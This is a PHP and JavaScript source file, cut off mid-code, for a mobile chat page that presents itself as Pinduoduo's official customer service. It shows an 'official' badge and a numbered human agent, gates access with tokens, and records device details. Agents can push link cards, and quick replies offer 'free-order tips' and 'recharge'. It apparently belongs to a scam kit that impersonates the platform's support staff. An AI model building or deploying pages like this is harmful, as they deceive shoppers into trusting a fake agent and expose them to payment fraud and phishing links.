<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once $_SERVER['DOCUMENT_ROOT'] . '/config/session_parser.php';

// 记录访问量
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/chat_web.php';
recordVisit();
// 验证XEDATA令牌（仅检查有效性和过期时间）
function verifyXEDataToken($sessionId, $xedataToken) {
    $db = getDB();
    if (!$db) return false;
    
    $currentTime = date('Y-m-d H:i:s');
    
    $stmt = $db->prepare("SELECT * FROM `XE-SKDJWKSNCDATA` 
                         WHERE session_id = ? AND xedata_token = ? 
                         AND expires_at > ?");
    $stmt->bind_param("sss", $sessionId, $xedataToken, $currentTime);
    $stmt->execute();
    $result = $stmt->get_result();
    
    return $result->num_rows > 0;
}

// 获取参数
$sessionId = isset($_GET['id']) ? $_GET['id'] : '';
$xedataToken = isset($_GET['XEDATA']) ? $_GET['XEDATA'] : '';

// 验证
if (empty($sessionId) || empty($xedataToken)) {
    die('非法访问：缺少验证参数');
}

if (!verifyXEDataToken($sessionId, $xedataToken)) {
    die('非法访问：验证失败或链接已过期');
}

$sessionId = $_GET['id'] ?? 'aaaccazzz-ptestadmins';
$parsedSession = SessionParser::parseSessionId($sessionId);
$customerName = $parsedSession['customer'];
$agentAccount = $parsedSession['agent'];
?>
<html lang="zh"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>拼多多官方客服</title>
    <link href="//unpkg.com/layui@2.9.10/dist/css/layui.css" rel="stylesheet">
    <link rel="shortcut icon" href="/assets/img/pddicon.ico" type="image/x-icon">
    <script src="/assets/jquery.min.js"></script>
    <style>
.xile-loading-container { 
    display: flex; 
    flex-direction: column; 
    align-items: center; 
    justify-content: center; 
    height: 100vh; 
    background: #f5f5f5;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: 99999;
    transition: opacity 0.3s ease;
} 

.xile-loading-container.hidden {
    opacity: 0;
    pointer-events: none;
}

.xile-loading-spinner { 
    width: 40px; 
    height: 40px; 
    border: 3px solid #ddd; 
    border-top-color: #39f; 
    border-radius: 50%; 
    animation: xile-spin-9c580cac 1s linear infinite 
} 

@keyframes xile-spin-9c580cac { 
    to { 
        transform: rotate(1turn) 
    } 
} 

.xile-loading-text { 
    margin-top: 16px; 
    font-size: 14px; 
    color: #666 
}

        /* 字体导入 */
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap');
        
        /* 全局样式 */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Noto Sans SC', sans-serif;
            background-color: #e5e7eb;
            overflow: auto;
            overscroll-behavior: contain;
        }
        
        /* 聊天容器 */
        .chat-container {
            max-width: 24rem;
            margin: 0 auto;
            background-color: white;
            display: flex;
            flex-direction: column;
            height: 100%;
            position: relative;
            overflow: hidden;
        }
        
        /* 头部样式 */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0.75rem;
            border-bottom: 1px solid #e5e7eb;
            background-color: white;
            z-index: 10;
            flex-shrink: 0;
        }
        
        .header-title {
            display: flex;
            align-items: center;
        }
        
        .header h1 {
            font-size: 1.125rem;
            font-weight: 600;
            color: #1f2937;
        }
        
        .official-badge {
            margin-left: 0.375rem;
            background-color: #dc2626;
            color: white;
            font-size: 10px;
            padding: 0.125rem 0.25rem;
            border-radius: 0.125rem;
            line-height: 1;
        }
        
        .faq-link {
            font-size: 0.875rem;
            color: #374151;
            text-decoration: none;
        }
        
        /* 聊天区域 */
        .chat-area {
            flex: 1 1 0%;
            overflow-y: auto;
            background-color: #f3f4f6;
            padding: 1rem;
        }
        
        .messages-container {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }
        
        /* 系统消息 */
        .system-message {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 1rem 0;
        }
        
        .system-avatar {
            width: 36px;
            height: 36px;
            border-radius: 9999px;
            margin-bottom: 0.5rem;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
        }
        
        .system-text {
            font-size: 0.875rem;
            color: #1f2937;
        }
        
        .system-text span {
            font-weight: 600;
        }
        
        /* 客服消息 */
        .agent-message {
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
            margin-bottom: 20px;
        }
        
        .agent-avatar {
            width: 40px;
            height: 40px;
            border-radius: 9999px;
            flex-shrink: 0;
        }
        
        .message-bubble {
            position: relative;
            background-color: white;
            border-radius: 0.5rem;
            padding: 0.75rem;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            max-width: 80%;
            word-wrap: break-word;
    overflow-wrap: break-word;
        }
        
        .agent-bubble {
            border-top-left-radius: 0;
        }
        
        /* 订单卡片 */
        .order-card {
            width: 100%;
        }
        
        .order-content {
            display: flex;
            gap: 0.75rem;
            align-items: center;
        }
        
        .order-image {
            width: 72px;
            height: 72px;
            border-radius: 0.375rem;
            flex-shrink: 0;
        }
        
        .order-details {
            flex: 1 1 0%;
        }
        
        .order-title {
            font-size: 13px;
            color: #1f2937;
            line-height: 1.25;
            margin-bottom: 0.25rem;
        }
        
        .order-status {
            font-size: 13px;
            font-weight: 600;
            color: #f97316;
        }
        
        .order-divider {
            border-top: 1px solid #f3f4f6;
            margin-top: 0.5rem;
            padding-top: 0.5rem;
        }
        
        .order-id {
            font-size: 0.75rem;
            color: #9ca3af;
        }
        
        /* 客服消息带"拼"图标 */
        .agent-message-with-icon {
            display: flex;
            align-items: flex-end;
            gap: 0.25rem;
        }
        
        .pdd-icon {
            color: rgb(252 165 165 / 0.5);
            font-size: 1.25rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        
        /* 用户消息 */
        .user-message {
            display: flex;
            align-items: flex-start;
            justify-content: flex-end;
            gap: 0.75rem;
            margin-bottom: 20px;
        }
        
        .user-bubble {
            border-top-right-radius: 0;
            background-color: #FFF1F0;
            word-wrap: break-word;
    overflow-wrap: break-word;
        }
        
        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 9999px;
            flex-shrink: 0;
        }
        
        .message-text {
            font-size: 1rem;
            color: #1f2937;
        }
        
        /* 底部输入区域 */
        .footer {
            background-color: white;
            border-top: 1px solid #e5e7eb;
            flex-shrink: 0;
            position: relative;
        }
        
        /* 快捷回复 */
        .quick-replies {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
            padding-top: 0.75rem;
            padding-bottom: 0.5rem;
            display: flex;
            align-items: center;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .quick-replies::-webkit-scrollbar {
            display: none;
        }
        
        .quick-replies {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        
        .quick-reply-buttons {
            display: flex;
            gap: 0.5rem;
        }
        
        .quick-reply-btn {
            background-color: #f3f4f6;
            color: #374151;
            border-radius: 9999px;
            padding: 0.375rem 1rem;
            font-size: 0.875rem;
            border: none;
            cursor: pointer;
        }
        
        /* 输入栏 */
        .input-bar {
            display: flex;
            align-items: center;
            padding: 0.75rem;
            gap: 0.75rem;
        }
        
        .input-wrapper {
            flex: 1 1 0%;
            background-color: #f3f4f6;
            border-radius: 9999px;
            display: flex;
            align-items: center;
            padding: 0 1rem;
        }
        
        .message-input {
            width: 100%;
            background-color: transparent;
            font-size: 0.875rem;
            padding: 0.5rem 0;
            border: none;
            outline: none;
        }
        
        .message-input::placeholder {
            color: #6b7280;
        }
        
        /* 图标样式 */
        .icon {
            width: 1em;
            height: 1em;
            color: #4b5563;
        }
        
        .icon-xl {
            font-size: 1.875rem;
        }
        
        .icon-2xl {
            font-size: 1.5rem;
        }
        
        /* 图标容器 */
        .icon-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .icon-button {
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            padding: 0.25rem;
            border-radius: 0.25rem;
            transition: background-color 0.2s;
        }
        
        .icon-button:hover {
            background-color: #f3f4f6;
        }
        
        /* 工具栏样式 - 从底部弹出 */
        .toolbar-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 50;
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .toolbar-overlay.show {
            display: block;
            opacity: 1;
        }
        
        .toolbar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: white;
            z-index: 100;
            transform: translateY(100%);
            transition: transform 0.3s ease;
            border-radius: 1rem 1rem 0 0;
            padding: 1rem 0.75rem;
            box-shadow: 0 -2px 20px rgba(0, 0, 0, 0.15);
        }
        
        .toolbar.show {
            transform: translateY(0);
        }
        
        .toolbar-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            padding: 0.5rem 0;
        }
        
        .toolbar-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
        }
        
        .toolbar-icon {
            width: 56px;
            height: 56px;
            background-color: #f3f4f6;
            border-radius: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 0.5rem;
            transition: background-color 0.2s;
        }
        
        .toolbar-icon:hover {
            background-color: #e5e7eb;
        }
        
        .toolbar-icon svg {
            width: 28px;
            height: 28px;
            color: #4b5563;
        }
        
        .toolbar-label {
            font-size: 0.75rem;
            color: #374151;
        }
        
        /* 响应式调整 */
        @media (max-width: 640px) {
            .chat-container {
                max-width: 100%;
            }
        }

        
        /* 欢迎消息样式 */
        .welcome-message {
            text-align: center;
            color: #6b7280;
            font-size: 14px;
            margin: 16px 0;
            padding: 8px;
            background: #f9fafb;
            border-radius: 8px;
        }
        
        /* 特殊消息样式 */
        .special-message {
            background: white;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #e5e7eb;
        }
        
        .highlight-text {
            color: #ef4444;
            font-weight: 600;
        }
        
        .quick-question, .order-button {
            margin: 8px 0;
            padding: 8px 12px;
            background: #f3f4f6;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .quick-question:hover, .order-button:hover {
            background: #e5e7eb;
        }
        
        /* 消息发送者名称 */
        .sender-name {
            font-size: 12px;
            color: #6b7280;
            margin-bottom: 4px;
        }
        
        /* 错误卡片样式 */
        .payment-card.error {
            border-color: #fca5a5;
            background-color: #fef2f2;
        }
        
        .error-message {
            color: #dc2626;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        /* 图片上传按钮 */
        .image-upload-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        
        /* 隐藏文件输入 */
        .hidden-file-input {
            display: none;
        }
        
        /* 发送按钮样式 */
        .send-button {
            background-color: #fe2c55;
            color: white;
            border-radius: 0.375rem;
            padding-left: 1.25rem;
            padding-right: 1.25rem;
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
            font-size: 0.875rem;
            font-weight: 500;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s;
            white-space: nowrap;
        }
        
        .send-button:hover:not(:disabled) {
            background-color: #e11d48;
        }
        
        .send-button:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }
        
                /* 图片消息样式 */
        .message-image {
            max-width: 200px;
            max-height: 200px;
            border-radius: 8px;
            cursor: pointer;
            display: block;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            transition: transform 0.2s ease;
        }

        .message-image:hover {
            transform: scale(1.02);
        }

        /* 图片预览模态框 */
        .image-preview-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }

        .image-preview-content {
            max-width: 90%;
            max-height: 90%;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }

        .image-preview-modal.active {
            display: flex;
        }

        #app-wrapper {
            opacity: 0;
            transition: opacity 0.3s;
        }

        #app-wrapper.loaded {
            opacity: 1;
        }

        /* 卡片消息样式 */
        .message-card {
            background: #ffffff;
            border-radius: 8px;
            padding: 2px;
            max-width: 280px;
        }

        .message-card__header {
            justify-content: center; 
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .message-card__title {
            font-weight: 600;
            color: #fe2c55;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .message-card__content {
            color: #1f2937;
            font-size: 13px;
            line-height: 1.5;
            word-break: break-word;
            padding: 6px 0;
        }

        .message-card__actions {
            margin-top: 10px;
            padding-top: 10px;
        }

        .message-card__button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 6px 12px;
            background: #fe2c55;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.2s;
            width: 100%;
            cursor: pointer;
            border: none;
        }

        .message-card__button:hover {
            transform: translateY(-1px);
            box-shadow: 0 3px 8px rgba(254, 44, 85, 0.3);
        }

        .message-card__button:active {
            transform: translateY(0);
        }

        /* 提示消息样式 */
        #tipContainer {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 10000;
            text-align: center;
            max-width: 80%;
            opacity: 0;
            transition: opacity 0.3s;
        }
    </style>
</head>
<body>
    <div class="xile-loading-container" id="loadingContainer"> 
        <div class="xile-loading-spinner"></div> 
        <div class="xile-loading-text">正在连接客服...</div> 
    </div>

    <div id="app-wrapper">
    <div class="chat-container">
        <!-- 头部 -->
        <header class="header">
            <svg class="icon icon-2xl" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" width="1em" height="1em" viewBox="0 0 24 24" id="back-button">
                <path fill="currentColor" d="M15.41 16.58L10.83 12l4.58-4.59L14 6l-6 6l6 6z"></path>
            </svg>
            
            <div class="header-title">
                <h1>拼多多官方客服</h1>
                <span class="official-badge">官方</span>
            </div>
            
            <a href="#" class="faq-link">常见问题</a>
        </header>

        <!-- 聊天区域 -->
        <main id="chat-container" class="chat-area">
            <!-- 内容将由JavaScript动态生成 -->
        
                    <div class="system-message">
                        <img src="/assets/img/pdd.png" alt="客服头像" class="system-avatar">
                        <p class="system-text">人工客服 <span>工号23638</span> 为您服务</p>
                    </div>
                
                    <div class="agent-message">
                        <img class="agent-avatar" src="/assets/img/pdd.png" alt="客服头像">
                        <div class="special-message" style="max-width:80%;">
                            <div style="margin-bottom: 6px;font-size: 1rem;">茫茫人海，相遇就是缘分，我是人工客服：工号23638，很高兴为您服务！</div>
                        </div>
                    </div>
                
                                <div class="user-message" data-message-id="temp_txt_1778704274957_lqm2n9kfb">
                                    <div class="message-bubble user-bubble">
                                        <p class="message-text">1</p>
                                    </div>
                                </div>
                            
                                <div class="user-message" data-message-id="2128">
                                    <div class="message-bubble user-bubble">
                                        <p class="message-text">1</p>
                                    </div>
                                </div>
                            </main>

        <!-- 工具栏覆盖层 -->
        <div class="toolbar-overlay" id="toolbar-overlay"></div>

        <!-- 工具栏 -->
        <div class="toolbar" id="toolbar">
            <div class="toolbar-grid">
                <div class="toolbar-item">
                    <div class="toolbar-icon" id="image-upload-button">
                        <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" width="1em" height="1em" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M19 5v14H5V5zm0-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2m-4.86 8.86l-3 3.87L9 13.14L6 17h12z"></path>
                        </svg>
                    </div>
                    <span class="toolbar-label">照片</span>
                    <input type="file" accept="image/*" id="input-image" class="hidden-file-input">
                </div>
            </div>
        </div>

        <!-- 底部输入区域 -->
        <footer class="footer">
            <!-- 快捷回复 -->
            <div class="quick-replies">
                <div class="quick-reply-buttons">
                    <button class="quick-reply-btn" data-text="发订单给客服">发订单给客服</button>
                    <button class="quick-reply-btn" data-text="平台热门活动">平台热门活动</button>
                    <button class="quick-reply-btn" data-text="查询物流">查询物流</button>
                    <button class="quick-reply-btn" data-text="免单攻略">免单攻略</button>
                    <button class="quick-reply-btn" data-text="充值">充值</button>
                </div>
            </div>

            <!-- 输入栏 -->
            <div class="input-bar">
                <!-- 输入框 -->
                <div class="input-wrapper">
                    <textarea id="message-input" class="message-input" placeholder="请描述下您遇到的问题~" rows="1" style="height: 36px;"></textarea>
                </div>
                
                <!-- 图标容器 -->
                <div class="icon-container">
                    <!-- 加号图标 -->
                    <svg class="icon icon-xl icon-button" id="plus-button" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" width="1em" height="1em" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6z"></path>
                    </svg>
                    
                    <!-- 发送图标 -->
                    <button id="send-button" class="send-button" disabled="">发送</button>
                </div>
            </div>
        </footer>
    </div>

    <!-- 图片预览模态框 -->
    <div id="image-preview-modal" class="image-preview-modal">
        <img id="image-preview-content" src="" alt="预览图片" class="image-preview-content">
    </div>

    <script src="//unpkg.com/layui@2.9.10/dist/layui.js"></script>
<script>
// 拼多多客服聊天系统适配版
class PDDChatSystem {
    constructor() {
        this.sessionId = this.getSessionId();
        this.customerName = this.getCustomerName();
        this.agentAccount = this.getAgentAccount();
        this.lastMessageId = 0;
        this.pollingInterval = null;
        this.apiBaseUrl = '/api/chat/messages';
        this.isOnline = true;
        this.statusPollingInterval = null;
        this.isSending = false;
        this.isUploadingImage = false;
        this.platform = '拼多多';
        
        // 卡片相关初始化
        this.cardQueue = [];
        this.isProcessingCards = false;
    
        // 设备信息检测
        this.deviceInfo = this.detectDevice();
        this.pageVisible = true;
        this.lastActivityTime = Date.now();
        this.inactivityTimeout = null;
    
        // WebSocket 相关属性
        this.ws = null;
        this.wsConnected = false;
        this.wsConnectionStatus = 'disconnected';
        this.wsReconnectAttempts = 0;
        this.maxWsReconnectAttempts = 5;
        this.wsReconnectDelay = 3000;
        this.wsHeartbeatInterval = null;
        this.wsMessageQueue = [];
        this.preferWebSocket = true;
        this.wsAuthSent = false;
    
        // 连接状态显示
        this.connectionStatusElement = null;

        // 最近发送的消息 ID 集合 (用于去重)
        this.recentlySentMessageIds = new Set();
        // 最近通过 WebSocket 接收的消息 ID 集合 (用于轮询去重)
        this.recentlyReceivedWsMessageIds = new Set();
        // 最近发送的消息记录 (用于内容匹配去重)
        this._lastSentMessages = [];
        this._sentMessageCounter = 0;
        
        // 工具栏状态
        this.toolbarVisible = false;
        
        console.log('拼多多聊天系统初始化:', {
            sessionId: this.sessionId,
            customerName: this.customerName,
            agentAccount: this.agentAccount,
            platform: this.platform
        });
        
        console.log('检测到设备信息:', this.deviceInfo);
        
        this.init();
    }
    
    init() {
        this.showLoading();
        this.setupEventListeners();
        this.startPolling();
        this.startStatusPolling();
        this.setupImagePreview();
        this.setupToolbar();
        this.setupPageUnload();
        
        // 初始化WebSocket
        setTimeout(() => {
            this.initWebSocket();
        }, 1000);
        
        // 加载初始消息
        setTimeout(() => {
            this.loadInitialMessages();
        }, 500);
    }
    
    showLoading() {
        const loadingContainer = document.getElementById('loadingContainer');
        if (loadingContainer) {
            loadingContainer.classList.remove('hidden');
        }
    }
    
    hideLoading() {
        const loadingContainer = document.getElementById('loadingContainer');
        if (loadingContainer) {
            loadingContainer.classList.add('hidden');
            setTimeout(() => {
                loadingContainer.remove();
                const appWrapper = document.getElementById('app-wrapper');
                if (appWrapper) {
                    appWrapper.classList.add('loaded');
                }
            }, 300);
        }
    }
    
    setupEventListeners() {
        const self = this;
        
        // 发送按钮
        $('#send-button').on('click', function() {
            self.sendMessage();
        });
        
        // 输入框回车发送
        $('#message-input').on('keypress', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                self.sendMessage();
            }
        });
        
        // 输入框输入事件
        $('#message-input').on('input', function() {
            self.updateSendButton();
            self.autoResizeTextarea(this);
        });
        
        // 加号按钮 - 显示工具栏
        $('#plus-button').on('click', function() {
            self.showToolbar();
        });
        
        // 工具栏图片上传按钮
        $('#image-upload-button').on('click', function() {
            $('#input-image').click();
        });
        
        // 图片文件选择
        $('#input-image').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                self.uploadImage(file);
                self.hideToolbar();
            }
            $(this).val('');
        });
        
        // 快捷回复按钮
        $('.quick-reply-btn').on('click', function() {
            const text = $(this).attr('data-text') || $(this).text();
            $('#message-input').val(text);
            self.updateSendButton();
            self.autoResizeTextarea(document.getElementById('message-input'));
            $('#message-input').focus();
        });
        
        // 返回按钮
        $('#back-button').on('click', function() {
            window.history.back();
        });

        // 页面可见性变化
        $(document).on('visibilitychange', function() {
            if (!document.hidden) {
                self.pageVisible = true;
                self.updateOnlineStatus();
            } else {
                self.pageVisible = false;
                self.updateOnlineStatus();
            }
        });
        
        // 页面卸载
        $(window).on('beforeunload', function() {
            self.setCustomerOffline();
        });

    }
    
    setupToolbar() {
        const self = this;
        
        // 点击遮罩层关闭工具栏
        $('#toolbar-overlay').on('click', function() {
            self.hideToolbar();
        });
    }
    
    showToolbar() {
        $('#toolbar-overlay').addClass('show');
        $('#toolbar').addClass('show');
        this.toolbarVisible = true;
    }
    
    hideToolbar() {
        $('#toolbar-overlay').removeClass('show');
        $('#toolbar').removeClass('show');
        this.toolbarVisible = false;
    }
    
    autoResizeTextarea(textarea) {
        textarea.style.height = 'auto';
        const newHeight = Math.min(textarea.scrollHeight, 100);
        textarea.style.height = newHeight + 'px';
    }
    
    updateSendButton() {
        const hasText = $('#message-input').val().trim().length > 0;
        const sendButton = $('#send-button');
        
        if (hasText) {
            sendButton.prop('disabled', false);
        } else {
            sendButton.prop('disabled', true);
        }
    }
    
    sendMessage() {
        if (this.isSending) return;
        
        const input = $('#message-input');
        const content = input.val().trim();
        if (!content) return;
        
        this.isSending = true;
        this.updateSendButton();
        
        const self = this;
        
        // 添加临时消息到界面
        this._sentMessageCounter++;
        const tempId = 'temp_' + Date.now() + '_' + this._sentMessageCounter;
        this.appendMessages([{
            id: tempId,
            speaker_type: 1, // 用户消息
            content: content,
            customer_name: this.customerName,
            agent_account: this.agentAccount,
            created_at: new Date().toISOString()
        }]);

        // 记录已发送消息，用于去重
        this._lastSentMessages.push({
            tempId: tempId,
            content: content,
            speaker_type: 1,
            timestamp: Date.now()
        });
        // 只保留最近 20 条
        if (this._lastSentMessages.length > 20) {
            this._lastSentMessages.shift();
        }
        
        // 清空输入框
        input.val('');
        this.autoResizeTextarea(document.getElementById('message-input'));
        this.updateSendButton();
        this.scrollToBottom();
        
        // 更新在线状态
        this.updateOnlineStatus();
        
        // 准备API请求数据
        const apiMessageData = {
            action: 'send_message',
            session_id: this.sessionId,
            agent_account: this.agentAccount,
            speaker_type: 1,
            content: content,
            customer_name: this.customerName,
            platform: this.platform
        };
        
        // 通过API保存消息
        $.ajax({
            url: this.apiBaseUrl,
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(apiMessageData),
            success: function(data) {
                console.log('消息发送成功:', data);
                self.isSending = false;
                self.updateSendButton();
                
                if (data.success && data.message_id) {
                    self.lastMessageId = Math.max(self.lastMessageId, data.message_id);
                    
                    // 更新消息ID
                    if ($(`[data-message-id="${tempId}"]`).length > 0) {
                        $(`[data-message-id="${tempId}"]`).attr('data-message-id', data.message_id);
                    }
                    
                    // 记录消息ID
                    self.recentlySentMessageIds.add(data.message_id);
                    setTimeout(() => {
                        self.recentlySentMessageIds.delete(data.message_id);
                    }, 5000);
                }
            },
            error: function(xhr, status, error) {
                console.error('消息发送失败:', error);
                self.isSending = false;
                self.updateSendButton();
            }
        });
    }
    
    detectDevice() {
        const ua = navigator.userAgent;
        let device = {
            type: 'desktop',
            os: 'unknown',
            browser: 'unknown',
            platform: navigator.platform,
            userAgent: ua
        };
        
        if (/Android/.test(ua)) {
            device.os = 'Android';
            device.type = 'mobile';
        } else if (/iPhone|iPad|iPod/.test(ua)) {
            device.os = 'iOS';
            device.type = /iPad/.test(ua) ? 'tablet' : 'mobile';
        } else if (/Windows/.test(ua)) {
            device.os = 'Windows';
        } else if (/Mac OS X/.test(ua)) {
            device.os = 'macOS';
        } else if (/Linux/.test(ua)) {
            device.os = 'Linux';
        }
        
        if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) {
            device.browser = 'Chrome';
        } else if (/Firefox\//.test(ua)) {
            device.browser = 'Firefox';
        } else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) {
            device.browser = 'Safari';
        } else if (/Edg\//.test(ua)) {
            device.browser = 'Edge';
        }
        
        return device;
    }
    
    setupImagePreview() {
        const self = this;
        
        // 点击图片预览
        $(document).on('click', '.message-image', function() {
            const imageUrl = $(this).attr('src');
            if (imageUrl) {
                $('#image-preview-content').attr('src', imageUrl);
                $('#image-preview-modal').addClass('active');
            }
        });
        
        // 关闭预览
        $('#image-preview-modal').on('click', function(e) {
            if (e.target === this || $(e.target).hasClass('image-preview-modal')) {
                $(this).removeClass('active');
                $('#image-preview-content').attr('src', '');
            }
        });
        
        // ESC键关闭
        $(document).on('keyup', function(e) {
            if (e.key === 'Escape') {
                $('#image-preview-modal').removeClass('active');
                $('#image-preview-content').attr('src', '');
            }
        });
    }
    
    uploadImage(file) {
        const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp', 'image/bmp'];
        const maxSize = 5 * 1024 * 1024;
        
        if (!allowedTypes.includes(file.type)) {
            alert('请选择图片文件 (JPEG, PNG, GIF, WebP, BMP)');
            return;
        }
        
        if (file.size > maxSize) {
            alert('图片大小不能超过 5MB');
            return;
        }
        
        if (this.isUploadingImage) {
            alert('正在上传图片，请稍候...');
            return;
        }
        
        this.isUploadingImage = true;
        const self = this;
        
        // 创建本地预览
        const localPreviewUrl = URL.createObjectURL(file);
        
        // 添加临时图片消息
        this._sentMessageCounter++;
        const tempId = 'temp_img_' + Date.now() + '_' + this._sentMessageCounter;
        this.appendMessages([{
            id: tempId,
            speaker_type: 1,
            content: '',
            message_type: 'image',
            image_url: localPreviewUrl,
            is_temp: true,
            created_at: new Date().toISOString()
        }]);

        // 记录已发送图片消息，用于去重
        this._lastSentMessages.push({
            tempId: tempId,
            content: '[图片]',
            speaker_type: 1,
            messageType: 'image',
            timestamp: Date.now()
        });
        if (this._lastSentMessages.length > 20) {
            this._lastSentMessages.shift();
        }

        this.scrollToBottom();
        
        // 使用FormData上传
        const formData = new FormData();
        formData.append('image_file', file);
        formData.append('session_id', this.sessionId);
        formData.append('agent_account', this.agentAccount);
        formData.append('customer_name', this.customerName);
        formData.append('speaker_type', 1);
        
        $.ajax({
            url: this.apiBaseUrl + '?action=upload_image',
            method: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                self.isUploadingImage = false;
                URL.revokeObjectURL(localPreviewUrl);
                
                if (data.success && data.image_url) {
                    // 更新临时消息
                    const tempElement = $(`[data-message-id="${tempId}"]`);
                    if (tempElement.length > 0 && data.message_id) {
                        tempElement.attr('data-message-id', data.message_id);
                        tempElement.find('img').attr('src', data.image_url);
                        self.lastMessageId = Math.max(self.lastMessageId, data.message_id);
                    }
                } else {
                    // 更新为失败状态
                    const tempElement = $(`[data-message-id="${tempId}"]`);
                    if (tempElement.length > 0) {
                        tempElement.find('.message-text').html('<p>图片上传失败</p>');
                    }
                }
            },
            error: function() {
                self.isUploadingImage = false;
                URL.revokeObjectURL(localPreviewUrl);
                const tempElement = $(`[data-message-id="${tempId}"]`);
                if (tempElement.length > 0) {
                    tempElement.find('.message-text').html('<p>图片上传失败，请重试</p>');
                }
            }
        });
    }
    
    getSessionId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('id') || '';
    }
    
    getCustomerName() {
        const sessionId = this.getSessionId();
        if (sessionId.includes('-')) {
            const parts = sessionId.split('-');
            const customerPart = parts[0];
            return customerPart.substring(1, customerPart.length - 1);
        } else if (sessionId.includes('_')) {
            const parts = sessionId.split('_');
            return parts[0];
        }
        return '匿名用户';
    }
    
    getAgentAccount() {
        const sessionId = this.getSessionId();
        if (sessionId.includes('-')) {
            const parts = sessionId.split('-');
            const agentPart = parts[1];
            return agentPart.substring(1, agentPart.length - 1);
        } else if (sessionId.includes('_')) {
            const parts = sessionId.split('_');
            return parts[1];
        }
        return 'default_agent';
    }
    
    // 检测是否为卡片消息
    isCardMessage(content) {
        if (!content || typeof content !== 'string') return false;
        
        // 检测自定义卡片格式 XECARD#JSON
        if (content.startsWith('XECARD#') && content.length > 7) {
            try {
                const cardJson = content.substring(7);
                const cardData = JSON.parse(cardJson);
                if (cardData.type === 'custom_card' && cardData.title && cardData.content) {
                    return { type: 'custom', data: cardData };
                }
            } catch (e) {
                console.error('解析卡片数据失败:', e);
            }
        }
        
        return false;
    }
    
    // 生成卡片HTML
    generateCardHtml(cardData) {
        let html = `
            <div style="background: white; border-radius: 8px; margin: 4px 0; max-width: 280px;">
                <div style="font-weight: bold; font-size: 16px; color: #1f2937; margin-bottom: 8px;">
                    ${this.escapeHtml(cardData.title)}
                </div>
                <div style="color: #6b7280; font-size: 14px; line-height: 1.4;">
                    ${this.escapeHtml(cardData.content)}
                </div>
        `;
        
        // 如果有链接和按钮文字，添加按钮
        if (cardData.link && cardData.buttonText) {
            html += `
                <div style="margin-top: 12px;">
                    <a href="${this.escapeHtml(cardData.link)}" target="_blank" style="display: inline-block; padding: 6px 12px; background: #dc2626; color: white; text-decoration: none; border-radius: 4px; font-size: 13px;">
